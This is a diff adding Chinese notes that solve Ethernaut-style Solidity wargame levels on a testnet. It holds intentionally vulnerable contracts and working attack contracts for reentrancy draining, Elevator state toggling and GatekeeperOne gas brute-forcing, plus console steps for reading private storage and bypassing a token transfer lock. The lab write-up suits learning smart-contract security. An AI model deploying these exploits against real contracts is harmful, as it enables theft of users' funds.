@@ -13,13 +13,17 @@ submit instance
 
 2.1. await contract.contribute({value: 1})
 call 完后查看是否有balance，就可以send了
+
 2.2. await contract.getContribution()
 1
+
 2.3. 转 1 ether 
 await contract.send(1)
+
 2.4. await contract.owner()
 '0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
-# 最后一步，把钱取出来
+最后一步，把钱取出来
+
 2.5. await contract.withdraw()
 submit instance 
 
@@ -423,3 +427,432 @@ submit instance
 
 # 11 Reentrancy
 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+这个合约使用SafeMath的add，溢出攻击是无效的。
+我们可以通过重入攻击，在balances[msg.sender] -= _amount; 之前再次调用withdraw()来重复提现。
+
+11.1 编写攻击合约
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IContract {
+    function withdraw(uint256 _amount) external;
+    function donate(address _to) external payable;
+}
+
+contract AttackContract {
+    IContract victim;
+
+    constructor(address payable _victim) {
+        victim = IContract(_victim);
+    }
+
+    function withdraw(uint256 _amount) public {
+        victim.withdraw(_amount);
+    }
+
+
+    fallback() external payable {
+        victim.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        victim.withdraw(msg.value);
+    }
+}
+```
+
+11.2 查看合约balance，donate相同数量的wei
+
+attacker =  "0xfa6ddaf8194c20a72c5be4b4ad4aa1ed4138c091";
+toWei(await getBalance(contract.address))
+'1000000000000000'
+await contract.donate(attacker, {value: 1000000000000000})
+
+11.3 通过攻击合约调用withdraw
+
+https://sepolia.etherscan.io/tx/0x245d096511d20ec8c2d391e637a52af691271a1ceada1a0f6f06ab58c4576e4f
+
+11.4 查看合约balance
+
+toWei(await getBalance(contract.address))
+'0'
+
+submit instance
+
+# 12 Elevator
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
+编写攻击合约，设置一个toggle变量，可以让第二次调用isLastFloor返回true
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+
+contract Attacker is Building {
+    Elevator public elevator;
+    bool public toggle = true;
+
+    constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+    }
+
+    function isLastFloor(uint256) external override returns (bool) {
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack(uint256 _floor) public {
+        elevator.goTo(_floor);
+    }
+}
+```
+
+调用attack(1)即可   
+
+submit instance
+
+后来发现这道题有其他的解决方案，使用view或者pure函数避免state修改，使用其他判断条件来返回ture/false 
+
+1. view 和 pure 函数修饰符
+view 修饰符：
+
+view 修饰符用于标记一个函数，该函数不会修改区块链上的状态。这意味着函数不能更改状态变量，也不能执行诸如发送以太币或调用其他可能修改状态的合约之类的操作。
+使用 view 修饰符可以优化合约的安全性和性能，因为它确保函数不会意外地更改合约的状态。
+
+pure 修饰符：
+
+pure 修饰符比 view 更严格，表示该函数不仅不会修改状态，也不会读取状态。pure 函数只能使用其参数，并且不能访问或依赖于合约中的任何状态变量。
+pure 修饰符通常用于纯计算函数，比如数学运算，或者任何不依赖于区块链状态的逻辑。
+
+```
+contract Attacker is Building {
+    Elevator public elevator;
+    bool public toggle = true;
+
+    constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+    }
+
+    function isLastFloor(uint256) external view override returns (bool) {
+        return gasleft() % 2 == 0; // 根据gas剩余量的奇偶性返回不同结果
+    }
+
+    function attack(uint256 _floor) public {
+        elevator.goTo(_floor);
+    }
+}
+```
+
+
+# 13 Privacy
+
+通过脚本扫描slot 
+
+Contract Code exists, this is a contract address.
+Storage at slot 0: 0x0000000000000000000000000000000000000000000000000000000000000001
+Storage at slot 1: 0x0000000000000000000000000000000000000000000000000000000066d66248
+Storage at slot 2: 0x000000000000000000000000000000000000000000000000000000006248ff0a
+Storage at slot 3: 0xa8168c3dc4f1c7490190a66c9185db8fe97a9cd244b224ed18a19c2127bb0746
+Storage at slot 4: 0x71b581aea3cdfd96604b03f32c942f8b11827b053ebae6f8ec257b5779566ac3
+Storage at slot 5: 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f46092c899e5e323dc5a33b2f73cc8ad1
+Storage at slot 6: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 7: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 8: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 9: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 10: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 11: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 12: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 13: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 14: 0x0000000000000000000000000000000000000000000000000000000000000000
+Storage at slot 15: 0x0000000000000000000000000000000000000000000000000000000000000000
+
+Slot 0: bool public locked = true;
+
+locked 变量是一个布尔型，占用 1 个字节。0x01 表示 true，所以 0x000...001 的值表明该变量设置为 true。
+Slot 1: uint256 public ID = block.timestamp;
+
+ID 是一个 uint256 类型，占用 32 字节。存储槽 1 中的值是 0x0000000000000000000000000000000000000000000000000000000066d66248，这是一个 32 字节的整数。
+Slot 2:
+
+这里我们有三个变量：uint8 flattening、uint8 denomination 和 uint16 awkwardness。
+它们分别占用 1、1 和 2 字节，总共占用 4 字节，存储在同一个槽中。
+0x000000000000000000000000000000000000000000000000000000006248ff0a 的最低字节（右边）部分是 0x0a (10)，是 flattening 变量。
+下一个字节是 0xff (255)，是 denomination 变量。
+awkwardness 变量是一个 uint16，是 0x6248（25032，以十六进制表示）。这些值被打包在同一个槽中。
+Slots 3, 4, 5: bytes32[3] private data;
+
+data 是一个 bytes32 数组，包含三个元素。每个 bytes32 占用 32 字节（1 个槽），因此 data[0] 位于槽 3，data[1] 位于槽 4，data[2] 位于槽 5。
+从读取到的存储数据：
+Slot 3: 0xa8168c3dc4f1c7490190a66c9185db8fe97a9cd244b224ed18a19c2127bb0746 对应 data[0]
+Slot 4: 0x71b581aea3cdfd96604b03f32c942f8b11827b053ebae6f8ec257b5779566ac3 对应 data[1]
+Slot 5: 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f46092c899e5e323dc5a33b2f73cc8ad1 对应 data[2]
+
+data[2] 从 bytes32 到 bytes16 的转换是 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f （保留了一半的长度）
+
+解锁
+await contract.unlock("0x6d624ba3fa9b9a71bbe0ee5cb4c2583f")
+
+submit instance
+
+存储槽分配规则
+每个存储槽大小为 32 字节（256 位）：
+
+Solidity 的存储是基于 32 字节的存储槽模型。每个槽能够容纳多达 32 字节的数据。
+按顺序存储：
+
+状态变量按它们在合约中声明的顺序存储。
+变量打包：
+
+如果多个状态变量的大小之和小于或等于 32 字节（例如，bool、uint8、uint16 等），它们将被打包在同一个存储槽中。
+如果一个状态变量不能完全打包到当前的存储槽中（例如，它是一个 uint256 或 bytes32 类型），它将被存储在一个新的存储槽中。
+
+
+# 14 Gatekeeper One
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+enter前面使用了三个modifier，gateOne、gateTwo 和 gateThree。这些 modifier 会在 enter 函数执行之前执行，以确保满足一些条件。
+
+gateOne: 需要中间合约调用
+gateTwo: 需要 gasleft() % 8191 == 0 
+ - 这里选择直接 bruteforce，也可以通过remix debug的方式找到正确的gasleft或者减少bruteforce的范围
+
+gateThree: 需要 _gateKey 满足三个条件, 需要仔细分析
+
+用B1-B8表示_gateKey的8个字节
+1. require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+0x B5 B6 B7 B8 = 0 x 00 00 B7 B8,
+
+Hence B5 = 0, B6 = 0
+
+2. require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+
+0x 00 00 00 00 B5 B6 B7 B8 != 0 x B1 B2 B3 B4 B5 B6 B7 B8
+
+B1, B2, B3, B4 != 0
+
+3. require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+
+0x B5 B6 B7 B8 == 0x 00 00 last 2 bytes of tx.origin
+
+B7 B8 = last 2 bytes of tx.origin
+
+hence gate key = 0x Any Any Any Any 00 00 last 2 bytes of tx.origin
+
+bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF
+
+
+编写攻击合约
+
+```
+pragma solidity ^0.8.0;
+
+contract GatekeeperOneAttack {
+    address public victim;
+
+    constructor(address _victim) {
+        victim = _victim;
+    }
+
+    function attack() external {
+        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; 
+        for (uint256 i = 0; i <= 8191; i++) {
+            (bool success, ) = address(victim).call{gas: 8191 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+
+```
+
+检查slot
+
+Connected to Sepolia test network
+Contract Balance: 0 ETH
+Transaction Count: 1
+Contract Code exists, this is a contract address.
+Storage at slot 0: 0x000000000000000000000000e5107dee9ccc8054210ff6129ce15eaa5bbcb1c0
+
+submit instance
+
+# 15 Gatekeeper Two
+
+2024-09-04 暂时跳过
+```
+```
+
+# 16 Naught Coin
+
+这个题目要求我们绕过transfer函数的限制来进行ERC20的代币转账，合约使用了OpenZeppelin的ERC20模版。
+
+查看contract abi发现Approve可以使用，可以通过approve来绕过transfer的限制
+
+receiver = "0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae"
+'0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae'
+
+balance = await contract.balanceOf(player)
+balance.toString()
+'1000000000000000000000000'
+
+执行approve
+await contract.approve(receiver, '1000000000000000000000000')
+
+allowance = await contract.allowance(player, receiver)
+allowance.toString()
+'1000000000000000000000000'
+
+使用transferFrom来转账
+await contract.transferFrom(player, receiver, '1000000000000000000000000')
+
+https://sepolia.etherscan.io/tx/0x95b58b47f9552fe64003d01f63e9e772add4f001110313ff8f5eed9526f29ea6
+
+submit instance
+
+# 17 Preservation
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
